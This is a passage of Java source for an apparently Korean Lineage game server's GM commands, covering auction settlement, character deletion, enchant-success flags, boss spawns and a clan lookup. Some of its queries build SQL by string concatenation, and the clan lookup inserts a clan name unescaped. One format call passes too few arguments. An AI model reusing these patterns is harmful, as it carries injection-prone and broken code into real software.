		case 135:
			ggg = "\\f4전설 [MP 흡수]";
			break;
		case 136:
			ggg = "\\f4전설 [소울오브프레임 발동]";
			break;
		case 137:
			ggg = "\\f4전설 [이뮨투함무시 +30%]";
			break;
		case 138:
			ggg = "\\f4전설 [저지먼트 발동]";
			break;
		case 139:
			ggg = "\\f4전설 [3단가속 효과]";
			break;
		default:
			ggg = "\\aA없음";
			break;
		}
		return ggg;
	}
	private static void countR4(L1PcInstance pc, String count) {
		int i = 0;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			i = Integer.parseInt(count);
		} catch (NumberFormatException e) {
		}
		String charname = null;
		int sellcount = 0;
		int status = 0;
		String buyerName = null;
		String buyerAccountName = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT  name, count, status, buyername, buyerAccountName from Auction where id Like '" + i + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {
				charname = rs.getString("name");
				sellcount = rs.getInt("count");
				status = rs.getInt("status");
				buyerName = rs.getString("buyername");
				buyerAccountName = rs.getString("buyerAccountName");
			}

			if (status == 1) {
				if (pc.getName().equalsIgnoreCase(charname) || pc.isGm()) {
					AuctionSystemTable.getInstance().AuctionComplete(i);
					try {
						WriteComplete(buyerName, sellcount, charname);
						//WriteComplete("메티스", sellcount, charname);
						Warehouse.present(buyerAccountName, 40308, 0, sellcount);
					} catch (Exception e) {
						e.printStackTrace();
					}
					pc.sendPackets("정상 판매 완료 되었습니다.");
				} else {
					pc.sendPackets("당신은 해당글의 판매자가 아닙니다.");
				}
			} else {
				pc.sendPackets("아직 구매 신청자가 없습니다.");
			}
		} catch (SQLException e) {
			pc.sendPackets(".판매완료(게시글번호)");
			pc.sendPackets(".판매완료 0017");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	private static void countR5(L1PcInstance pc, String count) {
		int i = 0;
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		try {
			i = Integer.parseInt(count);
		} catch (NumberFormatException e) {
		}
		int status = 0;
		String charname = null;
		String buyername = null;
		String buyeraccount = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement(
					"SELECT  name, status, buyername, buyerAccountName from Auction where id Like '" + i + "'");
			rs = pstm.executeQuery();
			while (rs.next()) {
				charname = rs.getString("name");
				status = rs.getInt("status");
				buyeraccount = rs.getString("buyerAccountName");
				buyername = rs.getString("buyername");
			}
			if (status == 0) {
				pc.sendPackets("구매 취소가 불가능한 상태입니다.");
				return;
			}
			if (status == 2) {
				pc.sendPackets("판매가 완료된 상태입니다.");
				return;
			}
			if (pc.getAccountName().equalsIgnoreCase(buyeraccount) || pc.isGm()) {
				AuctionSystemTable.getInstance().AuctionUpdate(i, "", "", "입금대기", 0);
				WriteCancle(buyername, charname);
				//WriteCancle("메티스", charname);
				pc.sendPackets("정상취소 되었습니다");
			} else {
				pc.sendPackets("등록하신 물품이 아닙니다");
			}
		} catch (SQLException e) {
			pc.sendPackets(".구매취소 (게시글번호) 라고 적어주십시요.");
			pc.sendPackets("예)  .구매취소 0035");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}
	// TODO 중개 거래 게시판

	private void standBy77(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			int objid = 0;
			String acname = null;
			if (target != null) {
				SC_Disconnect.send(target);
			}
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("SELECT objid, account_name FROM characters WHERE char_name=?");
				pstm.setString(1, pcName);
				rs = pstm.executeQuery();
				while (rs.next()) {
					objid = rs.getInt(1);
					acname = rs.getString(2);
				}
				if (objid == 0) {
					SC_SystemMessage.send(gm, "디비에 해당 유저의 이름이 존재하지 않습니다.");

				} else {
					SC_SystemMessage.send(gm, acname + "계정 " + pcName + "님의 케릭터를 삭제 합니다.");
					CharacterTable.getInstance().deleteCharacter(acname, pcName);
					SC_SystemMessage.send(gm, "해당유저를 정상적으로 삭제 하였습니다.");
				}
			} catch (SQLException e) {

			} finally {
				SQLUtil.close(rs);
				SQLUtil.close(pstm);
				SQLUtil.close(con);
			}

		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".케릭삭제 [케릭명]");
		}
	}

	private void Blessleaf(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._Blessleaf = true;
				gm.sendPackets("" + target.getName() + " 님의 기운을 잃은 아이템 성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".기운축복 캐릭명 으로 입력해주세요.");
		}
	}

	private void EnchantWeaponSuccess(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._EnchantWeaponSuccess = true;
				gm.sendPackets("" + target.getName() + " 님의 무기인챈성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".무기인챈성공 캐릭명 으로 입력해주세요.");
		}
	}

	private void EnchantArmorSuccess(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._EnchantArmorSuccess = true;
				gm.sendPackets("" + target.getName() + " 님의 방어인챈성공율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".방어인챈성공 캐릭명 으로 입력해주세요.");
		}
	}

	private void ErzabeBox(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._ErzabeBox = true;
				gm.sendPackets("(에르자베의 알)" + target.getName() + " 님의 4대마법 습득율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".에르자베 캐릭명 으로 입력해주세요.");
		}
	}

	private void SandwormBox(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target._SandwormBox = true;
				gm.sendPackets("(샌드웜의 주머니)" + target.getName() + " 님의 4대마법 습득율이 1회성으로 100% 적용됩니다.");
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".샌드웜 캐릭명 으로 입력해주세요.");
		}
	}

	private void befixed(L1PcInstance gm, String param) {
		try {
			StringTokenizer tok = new StringTokenizer(param);
			String phone = tok.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(param);
			if (target == null) {
				gm.sendPackets("캐릭터가 없습니다.");
				return;
			}

			Account account = Account.load(target.getAccountName());
			if (account.getphone() != null) {
				gm.sendPackets("이미 고정회원 입니다.");
				return;
			}
			account.setphone("00000000000");
			Account.updatePhone(account);
			gm.sendPackets(" " + phone + " 설정 완료 되었습니다.");
			target.sendPackets("고정신청이 완료되어 버프가 발동 됩니다.");
			보안버프(target);
		} catch (Exception e) {
		}
	}

	private static void 보안버프(L1PcInstance gm) {
		gm.getAC().addAc(-1);
		SC_PacketBox.send(gm, gm, SC_PacketBox.ICON_SECURITY_SERVICES);
		SC_OwnCharStatus.send(gm);
	}
	private void GoldDragon(L1PcInstance gm){
		String locName = MapsTable.getInstance().getMapName(gm.getMapId());
		try{
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6801, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1SpawnUtil.spawn2(gm.getX(), gm.getY(), (short) gm.getMapId(), 6802, 50, 3600*1000, 0);
			L1World.getInstance().broadcastServerMessage("\\aI[이벤트 스폰]: 괴상한 산타클로스 무리("+locName+")");
			SC_PacketBox.broadcastGreen("\\fO[이벤트 스폰]: 괴상한 산타클로스 무리 ("+locName+")");
			SC_Weather.broadcastAll(3);
		} catch (Exception e){
			SC_SystemMessage.send(gm, ".산타");
		}
	}
	private void searchclaner(L1PcInstance gm, String name) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(name);
			String charinfo = null;
			charinfo = String.format(
					"select account_name, char_name, level, clanname, OnlineStatus from characters where clanname Like '%s'",
					target.getClanname());

			if (target.getClan() == null) {
				gm.sendPackets("검색하신 캐릭터는 혈맹에 가입하지 않은 상태입니다.");
				return;
			}

			Selector.exec(charinfo, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					int i = 0;
					gm.sendPackets(String.format("================== 혈맹 정보 ==================", i));
					while (rs.next()) {
						++i;
						if (rs.getInt(5) > 0) {
							gm.sendPackets(String.format("\\fY계정:%s 캐릭명:%s 레벨:%s 혈맹:%s", rs.getString(1),
									rs.getString(2), rs.getString(3), rs.getString(4), rs.getInt(5)));
						}
					}
				}
			});

			String claninfo = null;
			claninfo = String.format("select total_m, current_m from clan_data where clan_name Like '%s'",
					target.getClanname());

			Selector.exec(claninfo, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					while (rs.next()) {
						gm.sendPackets(
								String.format("\\fU총 혈맹원 : [%s] 접속중인 혈맹원 : %s", rs.getString(1), rs.getString(2)));
					}
				}
			});
		} catch (Exception e) {
			gm.sendPackets("검색 하신 캐릭명이 틀리거나 존재 하지 않습니다.");
		}
	}

	private void DominanceBoss(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			int commandnum = Integer.parseInt(st.nextToken(), 10);
			List<DominanceBoss> list = DominanceDataLoader.getList();
			if (commandnum == 0) {
				DominanceDataLoader.reload();
				gm.sendPackets("지배의탑 보스 정보를 리로드 합니다.");
			}
			if (list.size() > 0) {
				for (DominanceBoss b : list) {
					try {
						switch (commandnum) {
						case 1:
							if (b.getBossNum() == 1) {
								DominanceFloorLv1 zenis = new DominanceFloorLv1(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								zenis.Start();
								gm.sendPackets("지배의 탑 1층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 2:
							if (b.getBossNum() == 2) {
								DominanceFloorLv2 sier = new DominanceFloorLv2(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								sier.Start();
								gm.sendPackets("지배의 탑 2층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 3:
							if (b.getBossNum() == 3) {
								DominanceFloorLv3 vampire = new DominanceFloorLv3(b.getNpcId(), b.getMapX(),
										b.getMapY(), b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(),
										b.getEffectNum());
								vampire.Start();
								gm.sendPackets("지배의 탑 3층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 4:
							if (b.getBossNum() == 4) {
								DominanceFloorLv4 zombie = new DominanceFloorLv4(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								zombie.Start();
								gm.sendPackets("지배의 탑 4층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 5:
							if (b.getBossNum() == 5) {
								DominanceFloorLv5 kuger = new DominanceFloorLv5(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								kuger.Start();
								gm.sendPackets("지배의 탑 5층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 6:
							if (b.getBossNum() == 6) {
								DominanceFloorLv6 mummy = new DominanceFloorLv6(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								mummy.Start();
								gm.sendPackets("지배의 탑 6층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 7:
							if (b.getBossNum() == 7) {
								DominanceFloorLv7 iris = new DominanceFloorLv7(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								iris.Start();
								gm.sendPackets("지배의 탑 7층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 8:
							if (b.getBossNum() == 8) {
								DominanceFloorLv8 bald = new DominanceFloorLv8(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								bald.Start();
								gm.sendPackets("지배의 탑 8층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 9:
							if (b.getBossNum() == 9) {
								DominanceFloorLv9 rich = new DominanceFloorLv9(b.getNpcId(), b.getMapX(), b.getMapY(),
										b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(), b.getEffectNum());
								rich.Start();
								gm.sendPackets("지배의 탑 9층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 10:
							if (b.getBossNum() == 10) {
								DominanceFloorLv10 ugnus = new DominanceFloorLv10(b.getNpcId(), b.getMapX(),
										b.getMapY(), b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(),
										b.getEffectNum());
								ugnus.Start();
								gm.sendPackets("지배의 탑 10층 보스 소환 이벤트를 진행합니다");
							}
							break;
						case 11:
							if (b.getBossNum() == 11) {
								DominanceFloorLv11 riper = new DominanceFloorLv11(b.getNpcId(), b.getMapX(),
										b.getMapY(), b.getMapId(), b.isMentuse(), b.getMent(), b.isAllEffect(),
										b.getEffectNum());
								riper.Start();
								gm.sendPackets("지배의 탑 정상 보스 소환 이벤트를 진행합니다");
							}
							break;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		} catch (Exception e) {
			gm.sendPackets("보스스폰 : .지배보스 0~11(0=리로드, 1~11=층별 보스)");
		}
	}
	
	
	private void do_cache_exp(MJCommandArgs args){
		try{
			final String character_name = args.nextString();
			if(MJCommons.isNullOrEmpty(character_name))
				throw new Exception();
			
			MJObjectWrapper<LevelExpPair> wrapper = new MJObjectWrapper<LevelExpPair>();
			Selector.exec("select * from character_exp_cache where character_name=?", new SelectorHandler(){
				@Override
				public void handle(PreparedStatement pstm) throws Exception {
					pstm.setString(1, character_name);
				}

				@Override
				public void result(ResultSet rs) throws Exception {
					if(rs.next()){
						wrapper.value = new LevelExpPair();
						wrapper.value.level = rs.getInt("lvl");
						wrapper.value.exp = rs.getInt("exp");
					}
				}
			});
			if(wrapper.value == null){
				args.notify(String.format("%s님의 캐시 경험치 데이터를 찾을 수 없습니다.", character_name));
				return;
			}
			L1PcInstance pc = L1World.getInstance().getPlayer(character_name);
			if(pc == null){
				Updator.exec("update characters set level=?, exp=? where char_name=?", new Handler(){
					@Override
					public void handle(PreparedStatement pstm) throws Exception {
						int idx = 0;
						pstm.setInt(++idx, wrapper.value.level);
						pstm.setInt(++idx, wrapper.value.exp);
						pstm.setString(++idx, character_name);
					}
				});
				args.notify(String.format("%s님의 데이터베이스 데이터를 업데이트 했습니다.(레벨:%d, 경험치:%d) ", 
						character_name, wrapper.value.level, wrapper.value.exp));
			}else{
				pc.setExp(wrapper.value.exp);
				args.notify(String.format("%s님의 경험치를 %d로 변경했습니다.", wrapper.value.exp));
			}
		}catch(Exception e){
			args.notify(".캐시경험치 [캐릭명]");
		}
	}

	static class LevelExpPair{
		int level;
		int exp;
	}
}
